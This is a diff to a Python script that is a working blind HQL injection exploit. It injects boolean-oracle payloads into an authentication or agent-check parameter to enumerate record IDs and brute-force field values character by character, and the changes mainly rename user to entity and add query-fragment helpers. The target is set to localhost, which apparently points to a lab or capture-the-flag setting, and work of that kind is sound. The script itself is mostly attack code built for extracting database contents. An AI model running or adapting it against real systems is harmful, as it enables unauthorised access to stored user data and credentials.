@@ -5,7 +5,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # =======================
 # CONFIG (edit these)
 # =======================
-CHEK_AGENT_URL = "http://127.0.0.1:8443/checkvalidagent"
+CHECK_AGENT_URL = "http://127.0.0.1:8443/checkvalidagent"
 AUTHENTICATE_URL = "http://127.0.0.1:8443/authenticate"
 VERIFY_TLS = False
 PROXY = {}  # disabled by default; set via --proxy <url>
@@ -15,16 +15,14 @@ LAST_MSG = ""
 MISSING_FIELDS: set[str] = set()
 COUNT_CACHE: dict[int, bool] = {}
 
-# Phase 1: userId discovery
+# Phase 1: entityId discovery
 TARGET_ENTITY_COUNT = 2
-USERID_MAXLEN = 8
-USERID_CHARSET = "0123456789"  # observed
+ENTITYID_MAXLEN = 8
+ENTITYID_CHARSET = "0123456789"  # observed
 
-# Phase 2: fields to try per user
+# Phase 2: fields to try per entity
 FIELDS = []
 DEFAULT_MAXLEN = 80
-FIELD_MAXLEN = {
-}
 
 # Phase 3: value brute charset
 CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- @:/()[]+,"
@@ -191,15 +189,24 @@ def esc(s: str) -> str:
 
 def inj(expr: str) -> str:
     # Boolean oracle wrapper
-    if TARGET == "AUTHENTICATE":
-        # Use a non-existent base username so the oracle depends on expr:
-        # - message null => True (expr satisfied)
-        # - message "Username or password is incorrect" => False
-        return f"x' or ({expr}) or '1'='2"
-    return f"0' or ({expr}) or '1'='2"
+    # Use a non-existent base username so the oracle depends on expr:
+    return f"x' or ({expr}) or '1'='2"
 
 def exists(hql_bool: str) -> str:
     return f"exists ( from {HQL_ENTITY} u where {hql_bool} )"
+
+# ---- HQL fragment builders (deduplicate string scaffolding) ----
+def eq(prop: str, value: str) -> str:
+    return f"u.{prop} = '{esc(value)}'"
+
+def is_not_null(prop: str) -> str:
+    return f"u.{prop} is not null"
+
+def len_ge(prop: str, n: int) -> str:
+    return f"length(u.{prop}) >= {n}"
+
+def like_prefix(prop: str, prefix: str) -> str:
+    return f"u.{prop} like '{esc(prefix)}%'"
 
 def is_unknown_property_error(field: str) -> bool:
     """Return True if the last response message indicates an unknown/invalid property."""
@@ -349,7 +356,6 @@ def resolve_entities(candidates: list[str]) -> list[str]:
     resolved: list[str] = []
     for ent in candidates:
         # Probe by referencing the entity in a subquery; result truth value isn't important
-        LAST_MSG_placeholder = LAST_MSG  # no-op, we only read LAST_MSG after the call
         _ = truthy(inj(f"exists ( from {ent} u where 1=1 )"))
         if is_unknown_entity_error(ent):
             print(f"[-] not mapped: {ent}")
@@ -411,7 +417,7 @@ def do_request(agent: str):
     else:
         params = {"agentCode": agent}
         r = requests.get(
-            CHEK_AGENT_URL,
+            CHECK_AGENT_URL,
             params=params,
             headers=HEADERS,
             timeout=20,
@@ -506,21 +512,21 @@ def oracle_ok() -> bool:
     return ok
 
 # =======================
-# Phase 1: enumerate userIds
+# Phase 1: enumerate entityIds
 # =======================
-def prefix_is_user(prefix: str, extra_where: str = "1=1"):
+def prefix_is_entity(prefix: str, extra_where: str = "1=1"):
     field = ID_FIELD or "id"
-    return truthy(inj(exists(f"{extra_where} and u.{field} like '{esc(prefix)}%'")))
+    return truthy(inj(exists(f"{extra_where} and {like_prefix(field, prefix)}")))
 
-def recover_one_userid(extra_where: str = "1=1"):
+def recover_one_entityid(extra_where: str = "1=1"):
     # ensure any row is visible under this filter
     if truthy(inj(exists(extra_where))) is not True:
         return None
     prefix = ""
-    for pos in range(1, USERID_MAXLEN + 1):
+    for pos in range(1, ENTITYID_MAXLEN + 1):
         advanced = False
-        for c in USERID_CHARSET:
-            if prefix_is_user(prefix + c, extra_where):
+        for c in ENTITYID_CHARSET:
+            if prefix_is_entity(prefix + c, extra_where):
                 prefix += c
                 print(f"[id:{ID_FIELD or 'id'}] pos {pos:02d}: {prefix}")
                 advanced = True
@@ -529,11 +535,11 @@ def recover_one_userid(extra_where: str = "1=1"):
             break
     return prefix if prefix else None
 
-def enumerate_userids(target_count: int) -> list[str]:
+def enumerate_entityids(target_count: int) -> list[str]:
     found: list[str] = []
     extra = "1=1"
     while len(found) < target_count:
-        uid = recover_one_userid(extra_where=extra)
+        uid = recover_one_entityid(extra_where=extra)
         if not uid:
             break
         print(f"[result] {ID_FIELD or 'id'}: {uid}")
@@ -548,46 +554,46 @@ def enumerate_userids(target_count: int) -> list[str]:
 # =======================
 # Phase 2–3: fields & values
 # =======================
-def field_not_null(user_id: str, field: str):
+def field_not_null(entity_id: str, field: str):
     idf = ID_FIELD or "id"
-    where = f"u.{idf} = '{esc(user_id)}' and u.{field} is not null"
+    where = f"{eq(idf, entity_id)} and {is_not_null(field)}"
     return truthy(inj(exists(where)))
 
-def has_len_at_least(user_id: str, field: str, n: int):
+def has_len_at_least(entity_id: str, field: str, n: int):
     idf = ID_FIELD or "id"
-    where = f"u.{idf} = '{esc(user_id)}' and u.{field} is not null and length(u.{field}) >= {n}"
+    where = f"{eq(idf, entity_id)} and {is_not_null(field)} and {len_ge(field, n)}"
     return truthy(inj(exists(where)))
 
-def prefix_is(user_id: str, field: str, prefix: str):
+def prefix_is(entity_id: str, field: str, prefix: str):
     idf = ID_FIELD or "id"
-    where = f"u.{idf} = '{esc(user_id)}' and u.{field} like '{esc(prefix)}%'"
+    where = f"{eq(idf, entity_id)} and {like_prefix(field, prefix)}"
     return truthy(inj(exists(where)))
 
-def recover_field(user_id: str, field: str, maxlen: int):
+def recover_field(entity_id: str, field: str, maxlen: int):
     # If we've already learned this field doesn't exist on the entity, skip globally
     if field in MISSING_FIELDS:
         if DEBUG:
             print(f"[i] skipping {field}: previously marked missing on {HQL_ENTITY}")
         return None
-    present = field_not_null(user_id, field)
+    present = field_not_null(entity_id, field)
     if present is not True:
         if is_unknown_property_error(field):
             MISSING_FIELDS.add(field)
-            print(f"[i] disabling {field}: not a property on {HQL_ENTITY}; skipping for all users")
+            print(f"[i] disabling {field}: not a property on {HQL_ENTITY}; skipping for all entities")
             return None
-        print(f"[i] {field} is null/absent for {user_id}")
+        print(f"[i] {field} is null/absent for {entity_id}")
         return None
 
     # length bound
     length = 0
     for k in range(1, maxlen + 1):
-        t = has_len_at_least(user_id, field, k)
+        t = has_len_at_least(entity_id, field, k)
         if t is True:  length = k
         elif t is False: break
         else: break
 
     if length == 0:
-        print(f"[i] {field} length=0 for {user_id}")
+        print(f"[i] {field} length=0 for {entity_id}")
         return ""
 
     # brute prefix
@@ -595,13 +601,13 @@ def recover_field(user_id: str, field: str, maxlen: int):
     for pos in range(1, length + 1):
         advanced = False
         for c in CHARSET:
-            if prefix_is(user_id, field, val + c):
+            if prefix_is(entity_id, field, val + c):
                 val += c
-                print(f"[+] {user_id} :: {field} pos {pos:02d}: {val!r}")
+                print(f"[+] {entity_id} :: {field} pos {pos:02d}: {val!r}")
                 advanced = True
                 break
         if not advanced:
-            print(f"[!] stalled at pos {pos} for {field} on {user_id}; widen CHARSET")
+            print(f"[!] stalled at pos {pos} for {field} on {entity_id}; widen CHARSET")
             break
     return val
 
@@ -610,7 +616,7 @@ def discover_and_dump_fields(user_ids: list[str]):
     for uid in user_ids:
         print(f"\n===== Enumerating fields for {ID_FIELD or 'id'} {uid} =====")
         for field in FIELDS:
-            maxlen = FIELD_MAXLEN.get(field, DEFAULT_MAXLEN)
+            maxlen = DEFAULT_MAXLEN
             value = recover_field(uid, field, maxlen)
             if value is not None:
                 print(f"[result] {uid} :: {field} = {repr(value)}")
@@ -950,13 +956,13 @@ def main():
     # Determine identifier field before oracle probes/enumeration
     discover_id_field(args.id_field)
     oracle_ok()
-    user_ids = enumerate_userids(TARGET_ENTITY_COUNT)
-    if not user_ids:
+    entity_ids = enumerate_entityids(TARGET_ENTITY_COUNT)
+    if not entity_ids:
         pass
-    if user_ids:
-        discover_and_dump_fields(user_ids)
+    if entity_ids:
+        discover_and_dump_fields(entity_ids)
     else:
-        print("[i] No userIds available for field enumeration")
+        print("[i] No entityIds available for field enumeration")
 
 if __name__ == "__main__":
     main()
